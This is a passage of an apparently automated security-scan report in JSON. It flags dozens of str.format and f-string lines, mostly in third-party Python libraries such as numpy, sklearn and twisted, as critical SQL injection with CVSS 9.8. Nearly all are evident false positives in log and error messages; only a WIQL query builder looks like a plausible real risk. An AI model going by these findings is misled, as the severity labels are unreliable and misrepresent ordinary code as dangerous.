          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_release.py",
            "line": 115,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "return \"from incremental import Version\\n__version__={!r}\".format(",
            "context": "    @param kwargs: Keyword arguments to pass to L{Version}.\n    \"\"\"\n    return \"from incremental import Version\\n__version__={!r}\".format(\n        Version(*args, **kwargs)\n    )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_asyncioreactor.py",
            "line": 92,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"on Python {}.{} ({})\".format(",
            "context": "        not _defaultEventLoopIsSelector,\n        \"default event loop: {}\\nis not of type SelectorEventLoop \"\n        \"on Python {}.{} ({})\".format(\n            type(_defaultEventLoop),\n            sys.version_info.major,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_asyncioreactor.py",
            "line": 112,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"on Python {}.{} ({})\".format(",
            "context": "        not _defaultEventLoopIsSelector,\n        \"default event loop: {}\\nis not of type SelectorEventLoop \"\n        \"on Python {}.{} ({})\".format(\n            type(_defaultEventLoop),\n            sys.version_info.major,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_asyncioreactor.py",
            "line": 133,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"on Python {}.{} ({})\".format(",
            "context": "        _defaultEventLoopIsSelector,\n        \"default event loop: {}\\nis of type SelectorEventLoop \"\n        \"on Python {}.{} ({})\".format(\n            type(_defaultEventLoop),\n            sys.version_info.major,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_endpoints.py",
            "line": 3263,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"ssl:4321:privateKey={}:certKey={}:dhParameters={}\".format(",
            "context": "        server = endpoints.serverFromString(\n            reactor,\n            \"ssl:4321:privateKey={}:certKey={}:dhParameters={}\".format(\n                escapedPEMPathName, escapedPEMPathName, fileName\n            ),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_endpoints.py",
            "line": 4293,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"tls:localhost:4321:privateKey={}:certificate={}:trustRoots={}:bindAddress=127.0.0.1\".format(",
            "context": "        endpoint = endpoints.clientFromString(\n            deterministicResolvingReactor(reactor, [\"127.0.0.1\"]),\n            \"tls:localhost:4321:privateKey={}:certificate={}:trustRoots={}:bindAddress=127.0.0.1\".format(\n                escapedPEMPathName,\n                escapedPEMPathName,",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/ssh/userauth.py",
            "line": 268,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "error = \"Unsupported key type {} or bad key\".format(algName.decode(\"ascii\"))",
            "context": "            keys.Key.fromString(blob)\n        except keys.BadKeyError:\n            error = \"Unsupported key type {} or bad key\".format(algName.decode(\"ascii\"))\n            self._log.error(error)\n            return defer.fail(UnauthorizedLogin(error))",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/spread/test/test_pbfailure.py",
            "line": 447,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "expectedOutput = \"Traceback from remote host -- \" \"{}: some reason\\n\".format(",
            "context": "        copied.printTraceback(output)\n        exception = qual(Exception)\n        expectedOutput = \"Traceback from remote host -- \" \"{}: some reason\\n\".format(\n            exception\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/formatters/html.py",
            "line": 559,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "0, '{}{{ background: {};{} }}'.format(",
            "context": "                text_style = ' ' + self.class2style[self.ttype2class[Text]][0]\n            lines.insert(\n                0, '{}{{ background: {};{} }}'.format(\n                    prefix(''), bg_color, text_style\n                )",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/formatters/html.py",
            "line": 565,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "0, '{} {{ background-color: {} }}'.format(prefix('hll'), hl_color)",
            "context": "        if hl_color is not None:\n            lines.insert(\n                0, '{} {{ background-color: {} }}'.format(prefix('hll'), hl_color)\n            )\n",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/lexers/nimrod.py",
            "line": 103,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "(r'({})\\b'.format(underscorize(['from', 'import', 'include', 'export'])),",
            "context": "             bygroups(Keyword, Text.Whitespace), 'funcname'),\n            (rf'({underscorize(keywords)})\\b', Keyword),\n            (r'({})\\b'.format(underscorize(['from', 'import', 'include', 'export'])),\n             Keyword.Namespace),\n            (r'(v_?a_?r)\\b', Keyword.Declaration),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/lexers/diff.py",
            "line": 88,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "(r'(\\s*)({})(.*)(\\n)'.format('|'.join(DPATCH_KEYWORDS)),",
            "context": "            (r'Context:', Generic.Heading),\n            (r'Patch bundle hash:', Generic.Heading),\n            (r'(\\s*)({})(.*)(\\n)'.format('|'.join(DPATCH_KEYWORDS)),\n                bygroups(Whitespace, Keyword, Text, Whitespace)),\n            (r'\\+', Generic.Inserted, \"insert\"),",
            "cvss_score": 9.8
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/lexers/modeling.py",
            "line": 322,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "(r'({})\\b'.format(r'|'.join(_stan_builtins.TYPES)), Keyword.Type),",
            "context": "            (r'T(?=\\s*\\[)', Keyword),\n            # Data types\n            (r'({})\\b'.format(r'|'.join(_stan_builtins.TYPES)), Keyword.Type),\n             # < should be punctuation, but elsewhere I can't tell if it is in\n             # a range constraint",
            "cvss_score": 9.8
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/devops_servers.py",
            "line": 613,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "wiql = f\"SELECT [System.Id], [System.Title], [System.State] FROM WorkItems WHERE {' AND '.join(conditions)}\"",
            "context": "                conditions.append(f\"[System.State] = '{state}'\")\n            \n            wiql = f\"SELECT [System.Id], [System.Title], [System.State] FROM WorkItems WHERE {' AND '.join(conditions)}\"\n        \n        url = f\"{self.base_url}/{project}/_apis/wit/wiql?api-version=7.0\"",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/servers/quality/test_quality_server.py",
            "line": 130,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "logger.info(f\"Selected {len(selected_tests)} high-priority tests\")",
            "context": "        # Sort by failure probability\n        selected_tests.sort(key=lambda x: x[\"failure_probability\"], reverse=True)\n        logger.info(f\"Selected {len(selected_tests)} high-priority tests\")\n        \n        # Verify test prioritization",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageFilter.py",
            "line": 588,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"size={:d}x{:d}x{:d}\".format(*self.size),",
            "context": "        r = [\n            f\"{self.__class__.__name__} from {self.table.__class__.__name__}\",\n            \"size={:d}x{:d}x{:d}\".format(*self.size),\n            f\"channels={self.channels:d}\",\n        ]",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/_store_backends.py",
            "line": 173,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "print(\"{0}...\".format(msg))",
            "context": "            msg = \"[Memory]{}: Loading {}\".format(ts_string, signature)\n            if verbose < 10:\n                print(\"{0}...\".format(msg))\n            else:\n                print(\"{0} from {1}\".format(msg, full_path))",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/_store_backends.py",
            "line": 175,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "print(\"{0} from {1}\".format(msg, full_path))",
            "context": "                print(\"{0}...\".format(msg))\n            else:\n                print(\"{0} from {1}\".format(msg, full_path))\n\n        mmap_mode = None if not hasattr(self, \"mmap_mode\") else self.mmap_mode",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/_store_backends.py",
            "line": 314,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "print(\"Deleting item {0}\".format(item))",
            "context": "        for item in items_to_delete:\n            if self.verbose > 10:\n                print(\"Deleting item {0}\".format(item))\n            try:\n                self.clear_location(item.path)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/_memmapping_reducer.py",
            "line": 64,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\" decrementing the refcount of the file (pid: {})\".format(",
            "context": "    util.debug(\n        \"[FINALIZER CALL] object mapping to {} about to be deleted,\"\n        \" decrementing the refcount of the file (pid: {})\".format(\n            os.path.basename(filename), os.getpid()\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/_memmapping_reducer.py",
            "line": 292,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"[MEMMAP REDUCE] reducing a memmap-backed array (shape, {}, pid: {})\".format(",
            "context": "    # offset that comes from the striding differences between a and m\n    util.debug(\n        \"[MEMMAP REDUCE] reducing a memmap-backed array (shape, {}, pid: {})\".format(\n            a.shape, os.getpid()\n        )",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/_memmapping_reducer.py",
            "line": 662,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Failed to delete temporary folder: {}\".format(pool_subfolder)",
            "context": "            except OSError:\n                warnings.warn(\n                    \"Failed to delete temporary folder: {}\".format(pool_subfolder)\n                )\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/disk.py",
            "line": 116,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "util.debug(\"Successfully deleted {}\".format(folder_path))",
            "context": "                    if len(files) == 0 or allow_non_empty:\n                        shutil.rmtree(folder_path, ignore_errors=False, onerror=None)\n                        util.debug(\"Successfully deleted {}\".format(folder_path))\n                        break\n                    else:",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/conftest.py",
            "line": 137,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\" during the test\".format(old_mode, new_mode))",
            "context": "    if old_mode != new_mode:\n        raise AssertionError(\"FPU precision mode changed from {0:#x} to {1:#x}\"\n                             \" during the test\".format(old_mode, new_mode))\n\n    collect_result = _collect_results.get(request.node)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/conftest.py",
            "line": 143,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\" when collecting the test\".format(old_mode,",
            "context": "        old_mode, new_mode = collect_result\n        raise AssertionError(\"FPU precision mode changed from {0:#x} to {1:#x}\"\n                             \" when collecting the test\".format(old_mode,\n                                                                new_mode))\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/ctypeslib.py",
            "line": 383,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Converting {!r} to a ctypes type\".format(dtype)",
            "context": "        except KeyError as e:\n            raise NotImplementedError(\n                \"Converting {!r} to a ctypes type\".format(dtype)\n            ) from None\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/__init__.py",
            "line": 453,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise RuntimeError(msg.format(__file__)) from None",
            "context": "                   \"package managers (pip, conda, apt, ...). Search closed \"\n                   \"numpy issues for similar problems.\")\n            raise RuntimeError(msg.format(__file__)) from None\n\n    _sanity_check()",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/cbook.py",
            "line": 2271,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "`type`).  Its ``__name__`` is set to ``fmt.format(Axes.__name__)`` and the",
            "context": "    ``Foo`` is a class that inherits from ``FooMixin`` and ``Axes`` and **is\n    picklable** (picklability is what differentiates this from a plain call to\n    `type`).  Its ``__name__`` is set to ``fmt.format(Axes.__name__)`` and the\n    base class is stored in the ``attr_name`` attribute, if not None.\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/collections.py",
            "line": 1421,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "msg = \"where size ({}) does not match {!r} size ({})\".format(",
            "context": "            where = np.asarray(where, dtype=bool)\n            if where.size != t.size:\n                msg = \"where size ({}) does not match {!r} size ({})\".format(\n                    where.size, self.t_direction, t.size)\n                raise ValueError(msg)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/varLib/cff.py",
            "line": 149,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"discarded.\".format(key=key)",
            "context": "                        \"Warning: {key} in default font Private dict is \"\n                        \"missing from another font, and was \"\n                        \"discarded.\".format(key=key)\n                    )\n                    continue",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/feaLib/ast.py",
            "line": 1896,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "keywords[\"vendor\"] = [\"Vendor\", lambda y: '\"{}\"'.format(y)]",
            "context": "        keywords.update([(x.lower(), [x, intarr2str]) for x in ranges])\n        keywords[\"panose\"] = [\"Panose\", intarr2str]\n        keywords[\"vendor\"] = [\"Vendor\", lambda y: '\"{}\"'.format(y)]\n        if self.key in keywords:\n            return \"{} {};\".format(",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/dictTools.py",
            "line": 74,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"{0} does not support item assignment\".format(self.__class__.__name__)",
            "context": "    def update(self, *args, **kwargs):\n        raise TypeError(\n            \"{0} does not support item assignment\".format(self.__class__.__name__)\n        )\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_memmapping.py",
            "line": 790,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"temporary folder {} was not deleted\".format(p._temp_folder)",
            "context": "        else:  # pragma: no cover\n            raise AssertionError(\n                \"temporary folder {} was not deleted\".format(p._temp_folder)\n            )\n        del p",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/test/test_memmapping.py",
            "line": 869,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"\"\".format(b=backend)",
            "context": "                        str(temp_folder) + \" was not deleted\"\n                    ) from e\n    \"\"\".format(b=backend)\n    env = os.environ.copy()\n    env[\"PYTHONPATH\"] = os.path.dirname(__file__)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/metrics/_classification.py",
            "line": 281,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"labels: {0}\".format(lb.classes_)",
            "context": "                \"The number of classes in labels is different \"\n                \"from that in y_prob. Classes found in \"\n                \"labels: {0}\".format(lb.classes_)\n            )\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/tests/test_common.py",
            "line": 155,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "assert hasattr(package, name), \"Module '{0}' has no attribute '{1}'\".format(",
            "context": "        package = __import__(modname, fromlist=\"dummy\")\n        for name in getattr(package, \"__all__\", ()):\n            assert hasattr(package, name), \"Module '{0}' has no attribute '{1}'\".format(\n                modname, name\n            )",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/utils/_indexing.py",
            "line": 434,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "f\"Selected columns, {columns}, are not unique in dataframe\"",
            "context": "                if not isinstance(col_idx, numbers.Integral):\n                    raise ValueError(\n                        f\"Selected columns, {columns}, are not unique in dataframe\"\n                    )\n                column_indices.append(col_idx)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/utils/validation.py",
            "line": 1056,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Complex data not supported\\n{}\\n\".format(array)",
            "context": "            except ComplexWarning as complex_warning:\n                raise ValueError(\n                    \"Complex data not supported\\n{}\\n\".format(array)\n                ) from complex_warning\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/utils/_optional_dependencies.py",
            "line": 21,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"`pip install matplotlib`\".format(caller_name)",
            "context": "        raise ImportError(\n            \"{} requires matplotlib. You can install matplotlib with \"\n            \"`pip install matplotlib`\".format(caller_name)\n        ) from e\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/utils/_optional_dependencies.py",
            "line": 46,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ImportError(\"{} requires pandas.\".format(caller_name)) from e",
            "context": "        return pandas\n    except ImportError as e:\n        raise ImportError(\"{} requires pandas.\".format(caller_name)) from e\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/feature_extraction/image.py",
            "line": 406,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ">>> print('Image shape: {}'.format(one_image.shape))",
            "context": "    >>> # Use the array data from the first image in this dataset:\n    >>> one_image = load_sample_image(\"china.jpg\")\n    >>> print('Image shape: {}'.format(one_image.shape))\n    Image shape: (427, 640, 3)\n    >>> patches = image.extract_patches_2d(one_image, (2, 2))",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/feature_extraction/image.py",
            "line": 496,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ">>> print('Image shape: {}'.format(one_image.shape))",
            "context": "    >>> from sklearn.feature_extraction import image\n    >>> one_image = load_sample_image(\"china.jpg\")\n    >>> print('Image shape: {}'.format(one_image.shape))\n    Image shape: (427, 640, 3)\n    >>> image_patches = image.extract_patches_2d(image=one_image, patch_size=(10, 10))",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/feature_extraction/image.py",
            "line": 499,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": ">>> print('Patches shape: {}'.format(image_patches.shape))",
            "context": "    Image shape: (427, 640, 3)\n    >>> image_patches = image.extract_patches_2d(image=one_image, patch_size=(10, 10))\n    >>> print('Patches shape: {}'.format(image_patches.shape))\n    Patches shape: (263758, 10, 10, 3)\n    >>> image_reconstructed = image.reconstruct_from_patches_2d(",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_california_housing.py",
            "line": 174,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"Downloading Cal. housing from {} to {}\".format(ARCHIVE.url, data_home)",
            "context": "\n        logger.info(\n            \"Downloading Cal. housing from {} to {}\".format(ARCHIVE.url, data_home)\n        )\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 301,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "url = _SEARCH_NAME.format(name) + \"/status/active/\"",
            "context": "    if version == \"active\":\n        # situation in which we return the oldest active version\n        url = _SEARCH_NAME.format(name) + \"/status/active/\"\n        error_msg = \"No active dataset {} found.\".format(name)\n        json_data = _get_json_content_from_openml_api(",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 302,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "error_msg = \"No active dataset {} found.\".format(name)",
            "context": "        # situation in which we return the oldest active version\n        url = _SEARCH_NAME.format(name) + \"/status/active/\"\n        error_msg = \"No active dataset {} found.\".format(name)\n        json_data = _get_json_content_from_openml_api(\n            url,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 328,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "url = (_SEARCH_NAME + \"/data_version/{}\").format(name, version)",
            "context": "\n    # an integer version has been provided\n    url = (_SEARCH_NAME + \"/data_version/{}\").format(name, version)\n    try:\n        json_data = _get_json_content_from_openml_api(",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 343,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "error_msg = \"Dataset {} with version {} not found.\".format(name, version)",
            "context": "        # TODO: feature request OpenML.\n        url += \"/status/deactivated\"\n        error_msg = \"Dataset {} with version {} not found.\".format(name, version)\n        json_data = _get_json_content_from_openml_api(\n            url,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 362,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "url = _DATA_INFO.format(data_id)",
            "context": ") -> Dict[str, Any]:\n    # OpenML API function: https://www.openml.org/api_docs#!/data/get_data_id\n    url = _DATA_INFO.format(data_id)\n    error_message = \"Dataset with data_id {} not found.\".format(data_id)\n    json_data = _get_json_content_from_openml_api(",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 363,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "error_message = \"Dataset with data_id {} not found.\".format(data_id)",
            "context": "    # OpenML API function: https://www.openml.org/api_docs#!/data/get_data_id\n    url = _DATA_INFO.format(data_id)\n    error_message = \"Dataset with data_id {} not found.\".format(data_id)\n    json_data = _get_json_content_from_openml_api(\n        url,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 382,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "url = _DATA_FEATURES.format(data_id)",
            "context": "    # OpenML function:\n    # https://www.openml.org/api_docs#!/data/get_data_features_id\n    url = _DATA_FEATURES.format(data_id)\n    error_message = \"Dataset with data_id {} not found.\".format(data_id)\n    json_data = _get_json_content_from_openml_api(",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 383,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "error_message = \"Dataset with data_id {} not found.\".format(data_id)",
            "context": "    # https://www.openml.org/api_docs#!/data/get_data_features_id\n    url = _DATA_FEATURES.format(data_id)\n    error_message = \"Dataset with data_id {} not found.\".format(data_id)\n    json_data = _get_json_content_from_openml_api(\n        url,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 402,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "url = _DATA_QUALITIES.format(data_id)",
            "context": "    # OpenML API function:\n    # https://www.openml.org/api_docs#!/data/get_data_qualities_id\n    url = _DATA_QUALITIES.format(data_id)\n    error_message = \"Dataset with data_id {} not found.\".format(data_id)\n    json_data = _get_json_content_from_openml_api(",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 403,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "error_message = \"Dataset with data_id {} not found.\".format(data_id)",
            "context": "    # https://www.openml.org/api_docs#!/data/get_data_qualities_id\n    url = _DATA_QUALITIES.format(data_id)\n    error_message = \"Dataset with data_id {} not found.\".format(data_id)\n    json_data = _get_json_content_from_openml_api(\n        url,",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 1034,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"this URL: {}\".format(",
            "context": "            \"Version {} of dataset {} is inactive, meaning that issues have \"\n            \"been found in the dataset. Try using a newer version from \"\n            \"this URL: {}\".format(\n                data_description[\"version\"],\n                data_description[\"name\"],",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/_openml.py",
            "line": 1150,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "description = \"{}\\n\\nDownloaded from openml.org.\".format(",
            "context": "        return bunch.data, bunch.target\n\n    description = \"{}\\n\\nDownloaded from openml.org.\".format(\n        data_description.pop(\"description\")\n    )",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/utils/tests/test_indexing.py",
            "line": 463,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "err_msg = \"Selected columns, {}, are not unique in dataframe\".format(key)",
            "context": "    X = pd.DataFrame(toy, columns=columns)\n\n    err_msg = \"Selected columns, {}, are not unique in dataframe\".format(key)\n    with pytest.raises(ValueError) as exc_info:\n        _get_column_indices(X, key)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 400,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "msg = \"Header length {} too big for version={}\".format(hlen, version)",
            "context": "        header_prefix = magic(*version) + struct.pack(fmt, hlen + padlen)\n    except struct.error:\n        msg = \"Header length {} too big for version={}\".format(hlen, version)\n        raise ValueError(msg) from None\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 649,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ValueError(msg.format(header)) from e2",
            "context": "            except SyntaxError as e2:\n                msg = \"Cannot parse header: {!r}\"\n                raise ValueError(msg.format(header)) from e2\n            else:\n                warnings.warn(",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 658,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ValueError(msg.format(header)) from e",
            "context": "        else:\n            msg = \"Cannot parse header: {!r}\"\n            raise ValueError(msg.format(header)) from e\n    if not isinstance(d, dict):\n        msg = \"Header is not a dictionary: {!r}\"",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 680,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise ValueError(msg.format(d['descr'])) from e",
            "context": "    except TypeError as e:\n        msg = \"descr is not a valid dtype descriptor: {!r}\"\n        raise ValueError(msg.format(d['descr'])) from e\n\n    return d['shape'], d['fortran_order'], dtype",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_arraysetops_impl.py",
            "line": 322,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "raise TypeError(msg.format(dt=ar.dtype)) from e",
            "context": "        # There's no good way to do this for object arrays, etc...\n        msg = 'The axis argument to unique is not supported for dtype {dt}'\n        raise TypeError(msg.format(dt=ar.dtype)) from e\n\n    def reshape_uniq(uniq):",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_arraypad_impl.py",
